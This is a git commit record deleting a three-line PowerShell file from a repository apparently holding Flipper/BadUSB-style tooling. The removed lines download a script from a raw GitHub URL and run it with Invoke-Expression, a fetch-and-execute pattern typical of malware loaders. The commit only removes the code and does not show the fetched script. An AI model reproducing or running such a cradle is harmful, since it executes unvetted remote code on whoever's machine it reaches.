e026878067cb7036f477aecae826cf8ec9cc35b1
BeansBeam <devplease10@gmail.com>
2024-06-27 11:30:47 +0200

    Delete source.ps1

--- Own Python Exe/System-D3V1LS/test/source.ps1
+++
@@ -1,3 +0,0 @@
-$scriptUrl = 'https://raw.githubusercontent.com/BeansBeam/Flipper-Files/main/Own%20Python%20Exe/System-D3V1LS/Powershell-Code/source.ps1'
-$scriptContent = Invoke-RestMethod -Uri $scriptUrl
-Invoke-Expression $scriptContent
